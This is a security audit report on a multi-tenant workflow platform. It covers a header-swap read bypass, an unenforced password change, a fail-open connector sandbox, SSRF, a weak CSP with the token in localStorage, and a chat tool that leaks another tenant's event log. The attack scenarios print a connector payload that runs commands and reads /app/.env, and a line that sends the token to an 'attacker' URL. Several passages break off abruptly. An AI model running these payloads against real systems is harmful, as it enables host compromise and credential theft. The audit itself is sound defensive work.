exploitability: Authenticated, within-org (not pre-auth, not cross-tenant — the org/tenant boundary is enforced at src/platform/pdp/index.ts:138 and by the in-org validation in resolveTenantContext). Reachable by any low-privilege org member who holds only a workflow-scoped (or no) role: they need a valid session token plus org membership, then simply change the X-Workflow-Id header to any other workflow id in the same org. The bypass is a one-header change with no special tooling. Impact is bounded to confidentiality (cross-workflow read disclosure of business rows, full Qlerify model JSON, event log with actors/caseIds, and connector endpoints/credential field-names/journal) plus a complete audit blind spot. It bites only when an admin relies on workflow-scoped roles for need-to-know separation between teams in one org — a realistic Ericsson on-prem posture given the UI advertises that exact scope. Not critical because there is no cross-org/tenant escape and no write/RCE via this path; high because it is trivially exploitable by a low-priv authenticated user, leaks sensitive cross-team data, and is entirely unaudited.
verifier_reasoning:
(confirmed) Every claim in the finding is verified in code. (1) src/platform/authn/index.ts:176-178 binds X-Workflow-Id after validating ONLY that the workflow row's organizationId matches the caller's org — there is no role check on the workflow. (2) src/platform/http/tenant-plugin.ts:51-79 shows the only request hooks just resolve+bind the context; there is no global read-authorization hook. (3) The cited read handlers call no PDP: /sim/event-log returns prisma.eventLog.findMany({ where: ...eventLogOrgWhere() }) (src/http/routes.ts:159), and likewise /sim/meta (173), /sim/flow-aggregate (207), /api/ontology (139), /api/bc/:bc/raw -> store.findMany (src/http/bc-routes.ts:173-180), /api/bc/:bc/row-events (189-203), and /api/connectors (src/http/connector-routes.ts:32-74, which discloses credentialKeys/endpoint/journal notes/rowCount). (4) eventLogOrgWhere() (src/platform/tenancy/event-scope.ts:21) scopes by currentWorkflowId()+currentOrgId(), both taken from the attacker-bound context; orgFilterSql (src/twin/projection-store.ts:74-77) filters rows by org only while physPrefix() (39-47) selects the gen__p<B>_* physical table from currentWorkflowId() — so the row filter never constrains to an entitled workflow. (5) workflow.read is defined at src/platform/pdp/action-map.ts:33 but the grep of all guardData() call sites returns only workflow.command.write / workflow.sim.* / connector.* / administer actions — it is genuinely dead code. (6) The write path DOES enforce workflow scope: guardData (src/platform/authz.ts:45-60) -> ensureAllowed -> authorize walks the containment chain (src/platform/pdp/index.ts:175-208), so a workflow-A-only editor/viewer is denied writes on workflow B, proving the read/write asymmetry. (7) Workflow-scoped roles are a real, UI-exposed isolation feature: the scope dropdown includes "workflow" (web/app.js:6178), POST /v1/role-assignments accepts scopeType="workflow" (src/platform/http/control-routes.ts:416-440), deleteWorkflow cascades scopeType:"workflow" grants (src/platform/provisioning/index.ts:220), and membership is granted independently of any role (POST /v1/memberships, control-routes.ts:376-395) — so a member holding viewer on workflow A only is an admin-creatable state. (8) guardData/ensureAllowed (src/platform/authz.ts:25-33) is the only data-plane audit hook, so these reads are unaudited. The action-map comment 'reads stay membership-scoped (any org member)' is an explicit design choice, but it directly contradicts the workflow-scoped-role capability the product also ships and enforces on writes — making this a genuine authorization gap, not a benign decision. Exploit is exactly as described: an authenticated member swaps the X-Workflow-Id header to a sibling workflow B in the same org and reads B's full event log, business rows, model JSON, and connector config with HTTP 200, no PDP denial, and zero audit rows. || (refuted) The finding's technical observations are accurate (data-plane reads call no PDP; X-Workflow-Id is validated only for org membership; workflow.read is never enforced on reads; reads write no audit row), but it mischaracterizes intended design as a high-severity authorization bypass against a boundary that does not exist.

(1) The actual tenant boundary — the organization — IS enforced. src/platform/authn/index.ts:177 validates X-Workflow-Id belongs to the caller's org (organizationId: org.id) and discards/falls-back any out-of-org id (:180-189). The org is derived from an active PlatOrgMembership, never the raw header (:119-168). PDP step-0 denies cross-org resources (src/platform/pdp/index.ts:138-139), and every read is org-filtered: projection rows by organization_id = currentOrgId() (src/twin/projection-store.ts:74-77) and EventLog by {workflowId, organizationId} (src/platform/tenancy/event-scope.ts:21). Cross-org/cross-tenant reads are impossible, so the user-controlled key never crosses the real trust boundary — CWE-639 does not apply.

(2) Within-org cross-workflow reads are documented, deliberate design, not a missing-control. src/platform/pdp/action-map.ts:30-32 explicitly states reads "stay membership-scoped (any org member), matching the dashboard read model." The unused workflow.read permission is an intentional decision, and the org-level portfolio dashboard structurally requires any org member to read across all workflows in the org.

(3) The finding's premise that "workflow-scoped roles enforce read need-to-know" is false. Read access is gated by org membership (PlatOrgMembership), not by role assignments; org membership grants zero PDP permissions on its own (src/platform/pdp/index.ts:183-194 requires a role assignment). Workflow-scoped roles only feed the PDP, which only gates writes via guardData (src/platform/authz.ts:45-60). No code path treats a workflow-scoped role as a read boundary, so there is no enforced/intended authorization control being bypassed — the finding conflates write-scoped roles with the membership-based read gate.

title: Forced password change (mustChangePassword) is advertised as a fix but is never enforced server-side — temp/reset credentials are fully usable indefinitely without ever being changed
cwe: CWE-620: Unverified Password Change
description: Commit ce8fc2d claims to add "member temp-password issuance / forced-change". The `mustChangePassword` flag is SET on issuance (`src/platform/provisioning/index.ts:133` — `data: { passwordHash: hashPassword(password), mustChangePassword: true }`) and CLEARED on a voluntary change (`control-routes.ts:228`), but it is never consulted by any authorization gate. The login handler mints and returns a full 12h session token regardless: `const { token } = await createSession(identity.id, new Date()); ... return { token, identity: { ... mustChangePassword: identity.mustChangePassword } ... }` (control-routes.ts:197-205). Neither `resolveTenantContext` (src/platform/authn/index.ts:115) nor the tenant plugin (src/platform/http/tenant-plugin.ts) ever checks `mustChangePassword`. A `grep` for the flag shows it is only written, returned in the login/whoami JSON, and cleared — there is no code path that restricts a must-change session. The 'forcing' is implemented purely as a client-side redirect in web/app.js, which an attacker simply ignores.
attack_scenario: An org admin invites a member (POST /v1/memberships) or resets a member (POST /v1/members/:id/reset-password); the server returns a one-time `temporaryPassword`, known to the admin and conveyed out-of-band. Anyone holding that temp password (the legitimate member, the issuing admin, or a third party who intercepts the out-of-band message) calls POST /v1/auth/login and receives a valid bearer token. Because no server gate enforces the change, they use that token against every API endpoint directly (e.g. `Authorization: Bearer <token>`), never calling POST /v1/account/password. The temp password also stays valid forever, so the admin-known / intercepted credential remains a working login indefinitely — the entire point of forced rotation (closing the interception window and making the issuer's knowledge single-use) is defeated, with no tripwire signalling that two parties share the credential.
recommendation: Enforce the flag server-side: in resolveTenantContext (or a preHandler) reject any request from an identity whose `mustChangePassword` is true with a 403/dedicated code unless the target is POST /v1/account/password or /v1/auth/logout. Equivalently, do not issue a normal session on a must-change login — issue a restricted, change-password-only token. Re-run the auth-issuance tests to assert that a must-change session cannot read/write any other endpoint.
exploitability: Not pre-auth, not cross-tenant, not RCE. The actor must already hold the temp/reset password: the legitimate member (who is entitled to full access regardless), the issuing org-admin (an already-trusted operator who could also re-reset at will), or a third party who intercepts the out-of-band conveyance. The concrete, real consequence is a credential-lifecycle weakness: the issuer's knowledge of the credential never becomes single-use, and an intercepted temp password's window never closes because the member can authenticate with it indefinitely without ever being forced to change it (a server-enforced forced-change on first sign-in would have killed the temp credential and revoked sibling sessions at control-routes.ts:228-232). This is defense-in-depth / trusted-operator territory for an on-prem Ericsson install rather than a privilege-boundary bypass, hence low rather than the finding's medium.
verifier_reasoning: (confirmed) The finding is accurate and confirmed by reading the full data flow. `mustChangePassword` is set true on issuance (src/platform/provisioning/index.ts:133), but a repo-wide grep shows it is ONLY ever (a) read to copy into the whoami JSON (src/platform/http/control-routes.ts:134,140), (b) returned in the login JSON (control-routes.ts:203), (c) cleared on a voluntary change (control-routes.ts:228), and (d) consumed client-side as an SPA redirect (web/app.js:1280-1286). The login handler at control-routes.ts:197 calls createSession() and returns a normal 12h opaque token UNCONDITIONALLY — no branch on the flag. The only request-time auth gate is tenant-plugin.ts onRequest -> resolveTenantContext (src/platform/authn/index.ts:115), which resolves the session token to an identity (authn/index.ts:79-84) and derives org/workflow context but never reads mustChangePassword; the preHandler (tenant-plugin.ts:75-79) merely binds that context. Therefore a token minted from a temp/reset-password login is a fully-usable session against every authenticated endpoint via Authorization: Bearer <token>, with no requirement to ever call POST /v1/account/password. The 'forcing' lives only in web/app.js:1280, which an attacker bypasses by hitting the API directly with curl. tests/platform/auth-issuance.test.ts:193-247 confirms there is no enforcement test — it asserts only the JSON flag value and that a VOLUNTARY change rotates sessions; line 246 shows the temp password stays valid for repeated logins until the member chooses to change it. So forced rotation is advertised but not enforced server-side, exactly as the finding states (CWE-620). || (confirmed) Traced every code path that touches `mustChangePassword`. It is SET true on issuance (src/platform/provisioning/index.ts:133), CLEARED on voluntary change (src/platform/http/control-routes.ts:228), and echoed into login/whoami JSON (control-routes.ts:134/140/203). title: Connector/adapter code execution reachable without the connector.edit authorization that /test and /pull require
cwe: CWE-862: Missing Authorization
description: Running a connector executes attacker-influenced code in the sandbox, so it is gated with `await guardData("connector.edit")` on `POST /api/bc/:bc/adapter/:id/test` (bc-routes.ts:157) and `POST /api/adapters/:id/pull` (routes.ts:289). But several other endpoints invoke the same execution path with NO PDP check: `POST /api/bc/:bc/adapter/:id/verify` calls `a.healthcheck()` (bc-routes.ts:139-148) with no guardData; `GET /api/adapters/:id` calls `await a.healthcheck()` inline (routes.ts:282) with no guard; and the chat tools `adapter_dry_run` (`a.pull()`) and `run_adapter_healthcheck` (`a.healthcheck()`) are deliberately omitted from `TOOL_WRITE_ACTIONS` (tools.ts:31-42), so `runTool` never calls `guardData` for them (tools.ts:383-384, 408-411). healthcheck/pull both reach `runConnector`, i.e. they execute the connector's `probe`/`fetchRows`.

title: Sandbox silently disabled when the runtime lacks the permission-model flag (warning-only fallback)
cwe: CWE-693: Protection Mechanism Failure
description: The entire D2 filesystem/capability confinement depends on Node accepting `--experimental-permission`/`--permission`. If it does not, `permissionFlag()` returns null with only `console.warn(...)` (lines 60-63) and `sandboxArgs()` returns `[]` (lines 68-72), so `runConnector` spawns the connector with NO permission model — full filesystem read/write across the host and full `child_process`/worker access. The reduced child env (`{PATH, HOME, NODE_OPTIONS:""}`) still keeps platform env secrets out, but without fs confinement the connector can read `/app/.env`, `prisma/dev.db`, SSH keys, and every tenant's data, and can spawn arbitrary processes (host RCE). The shipped image pins node:22 (where the flag exists), but an on-prem Ericsson install that runs a different/older Node, or where the experimental flag is disabled by org policy, silently loses the whole sandbox with no fail-closed behavior.
attack_scenario: On an on-prem host running the app under a Node build without the permission model (or with experimental flags disabled), an operator builds a connector whose code does `import('node:child_process').then(cp=>cp.execSync('id; cat /app/.env'))`; with sandboxArgs()=[] there is no `--allow-child-process` restriction, yielding full host command execution and disk read — the deployment only emitted a startup warning.
recommendation: Fail closed: when connectors are enabled but no permission-model flag (and no bubblewrap jail) is available, refuse to run connector code instead of executing it unconfined. Detect this at boot and disable the connector subsystem (or hard-error) rather than degrading to warning-only.
exploitability: Authenticated, not pre-auth. Requires: (1) connectors enabled (QLERIFY_CONNECTORS_ENABLED default true; gated at runConnector line 349); (2) an authenticated user able to build/run a connector — the connector subsystem enforces auth only and bypasses PDP/tenant isolation per the project's own connector-tenant-isolation-gap note, so any authed tenant can reach it cross-workflow/cross-org; and critically (3) a runtime WITHOUT Node's permission model (older/custom Node, or org policy disabling --experimental-* flags). The shipped node:22-slim image HAS the model and is therefore NOT exploitable via this path — confirmed by running node --experimental-permission locally (flag accepted, child_process + out-of-workspace fs both ERR_ACCESS_DENIED). When the precondition holds, an authed connector author gets unconfined host command execution (proven: execSync ran) plus arbitrary filesystem read (/app/.env, prisma/dev.db, every tenant's CAS/data, SSH keys) and write. Severity is medium rather than critical because the impactful state depends on a non-default deployment choice the operator controls, and it is a silent degradation of one defense layer (the global kill-switch and reduced child env still apply) rather than a break in the shipped configuration.

The connector body is untrusted by design — the file header (lines 1-9) states it "may import ANY npm package" and is "AI-/tenant-influenced code," and the runner imports it directly (RUNNER_SRC line 174: await import(modUrl)). D1's "workspace outside the repo" only defeats relative path traversal; it does nothing against absolute reads like readFileSync('/app/.env') or the control-plane prisma/dev.db. D4 bubblewrap is opt-in (QLERIFY_CONNECTOR_JAIL=bwrap, Linux-only, off by default; line 82). So with no permission model and no bwrap, the child is fully unconfined.

I proved the protection-vs-fail-open delta concretely. WITH the model (node --experimental-permission --allow-fs-read/write scoped to the workspace) a child doing child_process.execSync and readFileSync('/etc/hosts') both fail with ERR_ACCESS_DENIED. WITHOUT the flag (the sandboxArgs()==[] path) the same child prints CHILD_PROCESS_OK (ran whoami) and FS_READ_OUTSIDE_OK — i.e. arbitrary command execution and arbitrary fs read. permissionFlag() is consumed ONLY by sandboxArgs()->runConnector(); there is no boot-time fail-closed guard that disables the connector subsystem when the model is absent, so the recommendation (fail closed) is genuinely unimplemented.

title: Org-configured Qlerify MCP URL is fetched server-side with no allowlist — authenticated SSRF that defeats the modeller-link host pinning
cwe: CWE-918: Server-Side Request Forgery (SSRF)
description: parseWorkflowUrl() carefully pins the user-supplied modeller LINK to app.qlerify.com ('a caller-supplied sourceUrl can never aim the server's fetch at an arbitrary host (SSRF)'). But the actual outbound request does NOT go to that link — it goes to `resolveQlerifyCreds().url`, which is the org's own `qlerifyMcpUrl` override, and is fetched with no host validation: `const res = await fetch(url, { method:'POST', headers:{ 'x-api-key': apiKey … }, body: … })`. The same unguarded fetch runs at save time inside validateQlerifyCreds(url, apiKey). Neither passes through net-guard/assertSafeUrl, so the host-pinning intent is bypassed by the override path. On a non-2xx the internal response body is reflected back to the caller (`HTTP ${res.status} ${await res.text()}`), making it a usable SSRF read oracle.
attack_scenario: An org admin (organization.administer, e.g. via PUT /v1/organizations/:id/qlerify-config) sets the org's MCP URL to http://169.254.169.254/… or an internal service URL and a dummy key. validate-on-save immediately issues a server-side POST to that URL; the internal service's response/status is surfaced in the returned error. Every subsequent 'Reload from link' repeats the fetch. In the Ericsson on-prem network this lets an org admin pivot the server to internal-only hosts and read back responses.
recommendation: Run the org-override MCP URL (both in resolveQlerifyCreds()'s fetch and in validateQlerifyCreds) through assertSafeUrl()/an allowlist, exactly like the connector/authored fetch paths, and require https. Consider restricting the override to an operator-managed allowlist of modeller hosts rather than free-form per-org input, and avoid echoing the raw upstream response body in error messages.
exploitability: Requires an authenticated principal holding organization.administer on the target org (cannot be self-granted; must already be an org admin), and the URL is constrained to that admin's own org config — so it is NOT pre-auth and NOT a cross-tenant escalation. It is a partial read oracle (internal response bodies are reflected only on non-2xx responses; a 200 non-JSON-RPC body throws a generic 'Unrecognized MCP response' without echoing the body), but non-2xx endpoints (401/403/404/405/500) plus connect-success-vs-refused timing give a working internal port/service scanner. Every one of these child processes inherits root.

Running as root removes the last defense-in-depth layer beneath the connector RCE controls — exactly the layer an Ericsson highest-security install requires.

For the on-prem profile, ship with QLERIFY_CONNECTORS_ENABLED=false so npm is never reachable as an RCE amplifier.

title: CSP allows third-party script CDN with 'unsafe-eval' and the SPA loads it; bearer token sits in localStorage (supply-chain/MITM -> account takeover; breaks air-gap)
cwe: CWE-829: Inclusion of Functionality from Untrusted Control Sphere
description: The CSP is `script-src 'self' 'unsafe-eval' https://cdn.tailwindcss.com` (src/server.ts:31) and web/index.html:8 actually loads `<script src="https://cdn.tailwindcss.com"></script>` (plus Google Fonts at index.html:9-11). The combination of an external script origin AND 'unsafe-eval' means any script served from that origin can eval arbitrary strings inside the application origin. The session bearer token is kept in localStorage (web/app.js:196 `localStorage.getItem("ql.token")`) and is therefore readable by any script running in-origin.
attack_scenario: If cdn.tailwindcss.com (a public Cloudflare-fronted CDN) is compromised, or an on-prem network position lets an attacker MITM/spoof it (e.g. internal DNS, a non-TLS-pinned proxy), the attacker serves a malicious tailwind bundle. CSP permits it (origin allow-listed + 'unsafe-eval'), so it runs in the qlerify-live origin with the victim's privileges: it reads `ql.token` from localStorage and acts as the user against the same-origin API (connect-src 'self' allows that), then exfiltrates harvested tenant data via top-level navigation to an attacker URL (navigation is not constrained by connect-src/img-src). Result: full account/tenant takeover, and the entire CSP is defeated. Separately, on an air-gapped Ericsson on-prem network the CDN/Fonts simply fail to load, an availability gap; and the runtime egress to Cloudflare/Google leaks usage metadata.
recommendation: Self-host Tailwind (pre-built CSS, not the in-browser JIT) and the fonts; then remove 'unsafe-eval' and the external origins from script-src/style-src/font-src so script-src becomes `'self'`. Use Subresource Integrity for any remaining third-party asset. This makes the install fully offline-capable and shrinks the XSS/supply-chain surface to in-origin code only.
exploitability: Not exploitable by an unprivileged remote attacker against the app alone — it requires an external precondition: (a) supply-chain compromise of the third-party cdn.tailwindcss.com (realistic; cf. polyfill.io), or (b) a TLS-defeating MITM of that HTTPS origin on the on-prem network (corporate MITM proxy with a client-trusted root, or internal DNS spoofing with a forged cert). Once the precondition is met, the attacker's script runs in-origin with the victim's privileges, reads the localStorage bearer token, acts as the user against the same-origin API, and exfiltrates via top-level navigation — full account/tenant takeover and complete CSP bypass. No SRI mitigates it (none present). Secondary impact for air-gapped installs: availability gap (unstyled UI) plus usage-metadata egress to Cloudflare/Google. Severity capped at medium because the attack is supply-chain/MITM-gated rather than directly reachable, but the token-in-localStorage choice amplifies the blast radius of ANY in-origin script execution.
verifier_reasoning: (confirmed) All three load-bearing facts verified in code. (1) src/server.ts:31 sets `script-src 'self' 'unsafe-eval' https://cdn.tailwindcss.com` — the CSP (the app's declared XSS defense, per the comment at src/server.ts:23-28) intentionally allow-lists an external script origin plus 'unsafe-eval'. (2) web/index.html:8 actually loads `<script src="https://cdn.tailwindcss.com"></script>` with NO integrity/SRI attribute (grep over web/ finds zero `integrity=`), and there is no self-hosted Tailwind in the repo, so this is the in-browser Play CDN/JIT (the reason 'unsafe-eval' is present). Google Fonts are pulled at index.html:9-11. (3) The bearer token is stored in localStorage as `ql.token` (web/app.js:196, written at :199) and replayed as `Authorization: Bearer` at web/app.js:211; localStorage is readable by any same-origin script — the external-origin allow-listing alone is sufficient to read it, 'unsafe-eval' is only a secondary amplifier. The described attack chain is sound: a compromised/MITM'd cdn.tailwindcss.com serves a malicious bundle that runs in the qlerify-live origin (CSP permits it), reads ql.token, replays it against the same-origin API (connect-src 'self' allows it), and exfiltrates via top-level navigation (location= is not bounded by connect-src/img-src) → account/tenant takeover and full CSP defeat. The air-gap concern is also real: on an isolated Ericsson on-prem network the CDN/Fonts fail to load (UI is unstyled) and runtime egress to Cloudflare/Google leaks usage metadata. This is a genuine supply-chain/deploy-config/defense-in-depth weakness, accurately described. || (confirmed) All three cited facts are verified and there is no upstream guard that defeats them. (1) src/server.ts:31 sets script-src to `'self' 'unsafe-eval' https://cdn.tailwindcss.com`, and src/server.ts:47-52 applies the CSP on every response via the onRequest hook — so an external script origin plus 'unsafe-eval' really is allow-listed. (2) web/index.html:8 loads `<script src="https://cdn.tailwindcss.com"></script>` with no `integrity=` attribute; grep for `integrity=` across web/ returns nothing, so there is no SRI mitigation. (3) The bearer token is stored in localStorage (web/app.js:196 `localStorage.getItem("ql.token")`, set at :199, cleared at :204) and is readable by any in-origin script. I checked for the mitigations a refutation would rely on: there is no self-hosted Tailwind build (package.json `build` is just `tsc`), only one index.html served verbatim by @fastify/static (no prod variant strips the CDN), and no SRI. The only partial defense is TLS on the https:// CDN URL, which stops passive sniffing but not (a) compromise of the third-party cdn.tailwindcss.com bundle or (b) an active TLS-breaking proxy / rogue-CA MITM with no pinning — both of which the finding explicitly scopes. The exfil path also holds: connect-src 'self' blocks fetch/XHR to attacker origins, but this CSP defines no `navigate-to`/`form-action` directive, so a malicious in-origin script can leak the token via top-level navigation (`location = 'https://attacker/?t='+token`). So the CSP loosening genuinely creates a supply-chain/MITM route to in-origin code execution and session theft; I could not find a sanitizer/guard/unreachability that refutes it.

title: Chat tool get_event_log reads EventLog cross-tenant (missing org/workflow scope)
cwe: CWE-639: Authorization Bypass Through User-Controlled Key
attack_scenario: An authenticated member (even a viewer) of org A signs in and POSTs to /chat: "call get_event_log for caseId purchaseo-1a2b3c4d". `runAgentTurn` runs in org A's tenant context, but `handleGetEventLog` ignores that context and returns the full event timeline metadata (event names, refs, bounded contexts, roles, business + wall-clock timestamps) of that case even though it belongs to org B's workflow — leaking another tenant's process structure and operational timeline across the isolation boundary. caseIds are `<aggregate-prefix>-<8 hex>` and routinely appear in case-detail URLs, screenshots, exports and support tickets, so an attacker rarely needs to brute-force the 32-bit suffix to obtain a valid foreign caseId.
recommendation: Add the tenant scope to the query exactly like every other read site: `where: { caseId, ...eventLogOrgWhere() }`. Consider a lint/grep guard (or a thin repository wrapper) that forbids `prisma.eventLog.findMany/findFirst/groupBy` without `eventLogOrgWhere()` so future call sites can't regress.
exploitability: Requires an authenticated session as any member of any org (no special privilege — viewer suffices, since get_event_log is a read tool with no PDP/guardData check) plus knowledge of a valid foreign caseId. caseIds appear in URLs/exports/support tickets, so they are frequently obtainable without brute-forcing the 32-bit random suffix. Not reachable pre-auth. Impact is read-only cross-tenant disclosure of event metadata (event names, refs, bounded contexts, roles, business + wall-clock timestamps) — the process structure and operational timeline of another tenant's case; the domain payload field is NOT selected, so no PII/command-arg leakage. No write/RCE. Cross-tenant confidentiality breach, but bounded to metadata, hence medium rather than critical.
verifier_reasoning:
(confirmed) The cross-tenant leak is real and reachable. handleGetEventLog (src/chat/tools.ts:486-494) queries `prisma.eventLog.findMany({ where: { caseId } })` with NO `eventLogOrgWhere()` — confirmed by reading the function; the `select` exposes eventName, eventRef, boundedContext, role, businessAt, occurredAt (metadata, not payload). EventLog is one shared table carrying every tenant's rows with nullable organizationId/workflowId columns (prisma/schema.prisma:28-51), so an unscoped caseId filter crosses tenants. Every other EventLog read folds in `eventLogOrgWhere()` (which derives workflowId+organizationId from the AsyncLocalStorage tenant context — src/platform/tenancy/event-scope.ts:14-22): the sibling HTTP route at src/http/routes.ts:160 and genericInstanceDetail at src/twin/sim.ts:371 both scope; this is the one missed call site. Reachability is established: /chat (src/http/routes.ts:339) is not a public path (src/platform/http/tenant-plugin.ts:35-48 exempts only /v1/auth/* and static files), so it requires auth but runs inside the caller's bound org context (enterTenant, tenant-plugin.ts:75-79); get_event_log is a READ tool absent from TOOL_WRITE_ACTIONS (tools.ts:31-42), so the `if(action) await guardData(action)` PDP gate (tools.ts:383-384) never fires for it — meaning even a viewer-level member can invoke it. The caseId flows straight from the attacker-authored chat message via the LLM tool arg `String(args.caseId ?? "")` (tools.ts:393). caseIds are `<prefix>-<8 hex of randomUUID>` (src/util/ids.ts:3-6, src/twin/sim.ts:217); the 32-bit suffix is not trivially enumerable, but valid foreign caseIds are routinely exposed in case-detail URLs, exports, and tickets, so an attacker rarely needs to brute-force one. Net: an authenticated low-privilege member of org A can read org B's case event-log metadata — a genuine CWE-639 tenant-isolation bypass. || (confirmed) The finding is real. handleGetEventLog (src/chat/tools.ts:486-493) queries the shared EventLog table with `where: { caseId }` and NO tenant scope. I confirmed there is no upstream mitigation that defeats it:

1) The EventLog table is genuinely multi-tenant: a single shared Prisma table with `organizationId` and `workflowId` columns stamped at emit() (prisma/schema.prisma:48-51; comment "Multi-tenant spine ... stamped at the single emit() chokepoint"). So one table holds every org's/workflow's rows.

2) Tenant isolation for EventLog reads is enforced ONLY by folding eventLogOrgWhere() (src/platform/tenancy/event-scope.ts:14-22, which adds `{ workflowId: currentWorkflowId(), organizationId: currentOrgId() }`) into the where-clause. I grep'd every eventLog read/delete site: ALL of them scope (routes.ts:160/173/209/221/241, bc-routes.ts:30/196/264, sim.ts:152/236/328/341/346/360/361/371, derive.ts:416/474, correlate.ts:126, purge.ts:17, apply.ts:95) — EXCEPT tools.ts:487. The sibling HTTP route /sim/event-log does it correctly: `where: caseId ? { caseId, ...eventLogOrgWhere() } : eventLogOrgWhere()` (routes.ts:160). This is a single missed call site, not intentional design.
